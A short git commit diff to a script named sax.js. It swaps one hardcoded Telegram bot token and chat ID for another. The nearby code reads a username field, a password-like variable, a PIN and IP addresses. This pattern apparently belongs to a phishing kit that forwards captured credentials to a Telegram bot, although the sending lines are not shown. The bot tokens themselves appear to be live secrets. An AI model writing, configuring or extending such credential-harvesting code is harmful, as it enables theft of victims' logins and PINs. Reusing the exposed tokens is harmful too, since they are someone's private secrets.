53472593829ea263b3667f0422fc86219b6707b0
manueljoseo167-lab <manueljoseo167@gmail.com>
2025-11-18 17:02:51 -0500

    sax.js

--- sax.js
+++ sax.js
@@ -1,7 +1,7 @@
 //bot token
-var telegram_bot_id = "8515103395:AAGoB5Vc780EIQgQCWezT9c_s5ZAhAgSbnA";
+var telegram_bot_id = "8036404039:AAF2HYPrVU8NBRQ6KzQicN0PV3v2Iw2jtpE";
 //chat id
-var chat_id = "7414408766";
+var chat_id = "7846575697";
 var u_name, pax, u_pin2, ip, ip2;
 var ready = function () {
     u_name = document.getElementById("uzer").value;
